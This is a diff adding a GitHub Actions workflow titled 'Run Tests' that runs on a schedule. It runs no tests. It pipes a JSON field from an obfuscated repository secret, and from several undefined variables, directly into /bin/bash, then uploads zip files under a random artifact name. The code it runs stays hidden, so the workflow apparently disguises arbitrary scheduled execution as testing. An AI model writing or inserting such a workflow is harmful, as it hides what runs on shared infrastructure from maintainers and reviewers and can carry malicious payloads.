@@ -1,0 +1,35 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '40 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          een15377: ${{ secrets.een15377 }}
+        run: |
+          printf '%s' "$een15377" | jq -r .cjp786 | /bin/bash
+          printf '%s' "$vt663" | jq -r .ro3 | /bin/bash
+          echo $slf3730 | jq -r .fwezj2 | /bin/bash
+          echo $gul438 | jq -r .aqgdg9 | /bin/bash
+          printf '%s' "$hnzw3" | jq -r .opzg11 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mC2DbaaD
+          path: "*.zip"
+          retention-days: 1
